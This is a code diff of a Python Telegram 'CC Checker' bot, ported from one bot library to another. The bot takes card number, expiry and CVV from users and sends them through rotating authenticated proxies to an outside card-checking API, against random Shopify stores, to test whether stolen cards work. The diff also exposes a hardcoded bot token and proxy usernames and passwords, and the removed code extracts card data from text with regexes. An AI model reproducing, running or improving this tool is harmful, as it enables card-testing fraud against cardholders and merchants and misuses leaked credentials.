@@ -3,14 +3,12 @@ import time
 import threading
 import random
 import urllib.parse
-import asyncio
 import requests
+import telebot
 from typing import List
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ===================== CONFIG =====================
-BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"
+BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"  # <-- Replace with your actual token
 
 shop_urls = [
     "https://52a07b-2.myshopify.com",
@@ -35,7 +33,7 @@ shop_urls = [
     "https://burlap-kitchen.myshopify.com",
 ]
 
-# ===================== PROXY CONFIG (ONLY FRESH mk PROXIES) =====================
+# ===================== PROXY LIST (user:pass@host:port) =====================
 proxy_list = [
     "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.53:3129",
     "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.61.81:3129",
@@ -139,7 +137,19 @@ proxy_list = [
     "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.181.80:3129"
 ]
 
-# State tracking
+def convert_proxy_format(proxy_raw):
+    """
+    Convert 'user:pass@host:port' to 'host:port:user:pass'
+    """
+    try:
+        user_pass, host_port = proxy_raw.split('@')
+        user, passwd = user_pass.split(':')
+        host, port = host_port.split(':')
+        return f"{host}:{port}:{user}:{passwd}"
+    except Exception:
+        return None
+
+bot = telebot.TeleBot(BOT_TOKEN)
 user_check_in_progress = {}
 last_check_time = {}
 
@@ -275,53 +285,17 @@ def format_result(card, api_json, user, user_id, elapsed):
     )
     return text
 
-def extract_cards_from_text(text: str) -> List[str]:
-    patterns = [
-        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
-        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
-        r'\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b',
-        r'\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b',
-        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
-        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
-        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
-        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
-        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
-        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
-        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
-        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
-        r'^(\d{4})-(\d{4})-(\d{4})-(\d{4})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
-        r'^(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
-    ]
-    cards = []
-    for pattern in patterns:
-        matches = re.findall(pattern, text)
-        for match in matches:
-            if len(match) == 4:
-                cc, mm, yy, cvv = match
-                mm = mm.zfill(2)
-                if len(yy) == 4:
-                    yy = yy[2:]
-                card_string = f"{cc}|{mm}|{yy}|{cvv}"
-                if card_string not in cards:
-                    cards.append(card_string)
-    return cards
+# ===================== BOT COMMAND HANDLERS =====================
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "Welcome to the CC Checker Bot! Use /sh to check a card.")
 
-# ===================== BOT HANDLERS (async) =====================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome to the CC Checker Bot! Use /sh to check a card.")
-
-async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    uid = str(user.id)
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
+def check_card(message):
+    uid = str(message.from_user.id)
 
     if user_check_in_progress.get(uid, False):
-        await update.message.reply_text("⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
+        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
         return
 
     now = time.time()
@@ -329,45 +303,52 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cooldown = 0
     if now - last_end < cooldown:
         wait_sec = int(cooldown - (now - last_end))
-        await update.message.reply_text(f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}s…")
+        bot.reply_to(message, f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}s…")
         return
 
-    args = context.args
-    if not args:
-        await update.message.reply_text("❌ ᴜꜱᴀɢᴇ: /ꜱʜ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]")
+    args = message.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ꜱʜ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]")
         return
 
-    card = args[0].replace(" ", "")
+    card = args[1].replace(" ", "")
     if not is_valid_card(card):
-        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴄᴀʀᴅ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
+        bot.reply_to(message, "❌ ɪɴᴠᴀʟɪᴅ ᴄᴀʀᴅ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
         return
 
     user_check_in_progress[uid] = True
-    status_msg = await update.message.reply_text("ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")
+    status_msg = bot.reply_to(message, "ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")
     t0 = time.time()
 
     def process_check():
         try:
             max_attempts = 3
             response = None
-            last_error = None
 
             for attempt in range(max_attempts):
                 try:
                     proxy_raw = random.choice(proxy_list)
-                    proxy_url = f"http://{proxy_raw}"
-                    proxy_param = urllib.parse.quote(proxy_url, safe='')
+                    proxy_formatted = convert_proxy_format(proxy_raw)
+                    if not proxy_formatted:
+                        continue
+                    proxy_param = urllib.parse.quote(proxy_formatted, safe='')
 
                     shop_url = random.choice(shop_urls)
                     api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy_param}"
 
-                    # Direct connection; proxy is only passed as parameter
-                    response = requests.get(api_url, timeout=30)
+                    # Outer request: no proxy (disable system proxy)
+                    response = requests.get(api_url, timeout=30, proxies={"http": None, "https": None})
                     break
                 except Exception as e:
-                    last_error = e
                     if attempt == max_attempts - 1:
-                        raise
+                        # Final fallback: try without proxy parameter
+                        try:
+                            shop_url = random.choice(shop_urls)
+                            api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}"
+                            response = requests.get(api_url, timeout=30, proxies={"http": None, "https": None})
+                            break
+                        except Exception as e2:
+                            raise
                     time.sleep(1)
 
             try:
@@ -376,45 +357,25 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 api_json = {"Response": response.text}
 
             elapsed = time.time() - t0
-            user_display = user.username or user.first_name
-            result_text = format_result(
-                card, api_json,
-                user=user_display,
-                user_id=user.id,
-                elapsed=elapsed
-            )
+            user_display = message.from_user.username or message.from_user.first_name
+            result_text = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)
 
-            # Edit the status message with the result
-            context.bot.edit_message_text(
-                result_text,
-                chat_id=status_msg.chat_id,
-                message_id=status_msg.message_id,
-                parse_mode='HTML'
-            )
+            bot.edit_message_text(result_text, chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode='HTML')
 
         except Exception as e:
-            context.bot.edit_message_text(
-                f"❌ Error: {str(e)}",
-                chat_id=status_msg.chat_id,
-                message_id=status_msg.message_id
-            )
+            bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
         finally:
             user_check_in_progress[uid] = False
             last_check_time[uid] = time.time()
 
-    # Run blocking check in a separate thread to not block the async loop
-    loop = asyncio.get_event_loop()
-    await loop.run_in_executor(None, process_check)
+    threading.Thread(target=process_check, daemon=True).start()
 
-# ===================== MAIN =====================
-def main():
-    application = Application.builder().token(BOT_TOKEN).build()
-
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("sh", sh_command))
-
-    print("Bot started...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
-
+# ===================== BOT POLLING =====================
 if __name__ == "__main__":
-    main()
+    print("Bot started...")
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=60)
+        except Exception as e:
+            print(f"Polling error: {e}")
+            time.sleep(5)
